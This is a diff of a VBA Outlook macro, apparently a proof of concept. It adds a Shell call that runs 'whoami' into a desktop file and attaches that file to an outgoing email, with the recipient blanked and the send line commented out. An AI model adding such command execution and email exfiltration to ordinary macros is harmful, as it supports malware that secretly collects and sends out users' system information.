@@ -5,16 +5,17 @@ Sub cmd()
     ' SET Outlook APPLICATION OBJECT.
     Dim objOutlook As Object
     Set objOutlook = CreateObject("Outlook.Application")
-    
+    Shell ("cmd.exe /c whoami > C:\Users\\Desktop\check2.txt")
     ' CREATE EMAIL OBJECT.
     Dim objEmail As Object
     Set objEmail = objOutlook.CreateItem(olMailItem)
     With objEmail
-        .To = "EMAIL ADDRESS"
+        .To = ""
         .Subject = "This is a test message from **"
         .Body = "Hi there"
         .Display        ' Display the message in Outlook.
-        .Send
+        .Attachments.Add ("C:\Users\\Desktop\check2.txt")
+        ' .Send
     End With
     
     ' CLEAR.
